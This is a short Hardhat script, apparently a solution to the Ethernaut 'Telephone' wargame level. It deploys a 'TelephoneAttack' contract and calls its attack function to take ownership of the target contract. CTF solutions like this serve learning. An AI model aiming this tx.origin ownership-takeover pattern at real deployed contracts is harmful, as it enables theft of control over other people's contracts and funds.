import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x9bd03768a7DCc129555dE410FF8E85528A4F88b5";
const PLAYER_ADDRESS = "0x976EA74026E726554dB657fA54763abd0C3a0aa9";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Telephone", CONTRACT_ADDRESS, signer);

    const attackerFactory = await ethers.getContractFactory("TelephoneAttack");
    const attackerContract = await attackerFactory.deploy();

    attackerContract.attack(CONTRACT_ADDRESS, PLAYER_ADDRESS);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
